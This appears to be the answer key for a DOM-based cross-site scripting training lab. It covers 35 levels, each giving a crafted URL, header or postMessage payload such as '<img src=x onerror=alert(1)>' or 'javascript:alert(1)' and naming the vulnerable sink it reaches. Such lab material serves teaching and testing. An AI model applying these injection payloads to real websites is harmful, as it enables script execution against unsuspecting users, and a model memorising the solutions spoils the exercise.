# dom — solutions

Client-side DOM sinks driven by URL, hash, query, name, referrer, postMessage.

### dom-level1

`/dom/level1/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: document.write(decodeURI(location.href)) — hash-based sink in URL

### dom-level2

`/dom/level2/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: document.write(decodeURI(location.hash)) — payload in hash

### dom-level3

`/dom/level3/#javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: location.href = hash — javascript: URL navigation

### dom-level4

`/dom/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: document.write(query) — direct HTML sink

### dom-level5

`/dom/level5/?query=alert(1)`

- payload: `alert(1)`
- context: eval(query) — raw JS execution

### dom-level6

`/dom/level6/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: location.href = query — javascript: navigation

### dom-level7

`/dom/level7/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: innerHTML = hash; hash-based sink

### dom-level8

`/dom/level8/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: innerHTML = query

### dom-level9

`/dom/level9/?query=alert(1)`

- payload: `alert(1)`
- context: scriptTag.innerText = query — does not execute by default; payload becomes script body but innerText set after script already inserted — note: scriptTag is inert; this lab is generally non-exploitable in modern browsers but content is detectable in response

### dom-level10

`/dom/level10/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: img.src = query; modern browsers ignore js: on img, but the URL is reflected — limited; treat as detectable taint sink

### dom-level11

`/dom/level11/#javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: anchor.href = hash; user click triggers javascript: URL

### dom-level12

`[Header] /dom/level12/`

- header: `Cookie: x=<img src=x onerror=alert(1)>`
- context: document.write(document.cookie); requires cookie under attacker control

### dom-level13

`/dom/level13/`

- payload: open from a page that sets `window.name = '<img src=x onerror=alert(1)>'` then navigates here
- context: innerHTML = window.name; cross-window name-based sink

### dom-level14

`[Header] /dom/level14/`

- header: `Referer: http://x/?<img src=x onerror=alert(1)>`
- context: document.write(document.referrer); referer-controlled sink

### dom-level15

`/dom/level15/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: insertAdjacentHTML('beforeend', query)

### dom-level16

`/dom/level16/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: outerHTML = hash; hash-based sink

### dom-level17

`/dom/level17/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: link.setAttribute('href', query); user click runs JS URL

### dom-level18

`/dom/level18/#javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: iframe.src = hash — javascript: URL navigation inside frame

### dom-level19

`/dom/level19/?query=alert(1)`

- payload: `alert(1)`
- context: setTimeout(query, 0) — string evaluated as code

### dom-level20

`/dom/level20/#alert(1)`

- payload: `alert(1)`
- context: setInterval(hash, 1000) — string eval'd

### dom-level21

`/dom/level21/?query=alert(1)`

- payload: `alert(1)`
- context: new Function(query)(); raw JS body

### dom-level22

`/dom/level22/?query=%7B%22message%22:%22%3Cimg%20src=x%20onerror=alert(1)%3E%22%7D`

- payload: `{"message":"<img src=x onerror=alert(1)>"}`
- context: JSON.parse(query) then innerHTML = data.message

### dom-level23

`/dom/23-sender.html` (open and postMessage `<img src=x onerror=alert(1)>`)

- payload: `<img src=x onerror=alert(1)>`
- context: window.addEventListener('message') sets innerHTML = e.data; postMessage sink

### dom-level24

`/dom/level24/?query=$%7Balert(1)%7D`

- payload: `${alert(1)}`
- context: eval('`' + query + '`') — template literal interpolation

### dom-level25

`/dom/level25/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: innerHTML of `<form name="test">` + query — direct sink

### dom-level26

`/dom/level26/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: document.write(document.URL); document.URL includes the hash unencoded for the parser

### dom-level27

`/dom/level27/?<img src=x onerror=alert(1)>`

- payload: `<img src=x onerror=alert(1)>`
- context: innerHTML = location.search.substring(1); raw query string after `?`

### dom-level28

`/dom/level28/%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: document.write(location.pathname); browser may URL-decode path but `<` in path is preserved on document.write

### dom-level29

`/dom/level29/?query=alert(1)`

- payload: `alert(1)`
- context: link.href = 'javascript:' + query; click executes

### dom-level30

`/dom/level30/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: execCommand('insertHTML', false, query) into focused contenteditable

### dom-level31

`/dom/level31/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: range.createContextualFragment(hash) → appendChild; hash-based

### dom-level32

`/dom/level32/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: DOMParser parses then innerHTML — img element re-evaluates onerror

### dom-level33

`/dom/level33/?query=%3Cimg%20src=x%20onerror=alert(1)&query2=%3E`

- payload: `<img src=x onerror=alert(1)` + `>`
- context: innerHTML = param1 + param2 — split across two params

### dom-level34

`/dom/level34/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: obj.value = query then innerHTML = obj.value

### dom-level35

`/dom/level35/#%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: hash split by `,` joined with ''; payload has no commas so passes through to innerHTML
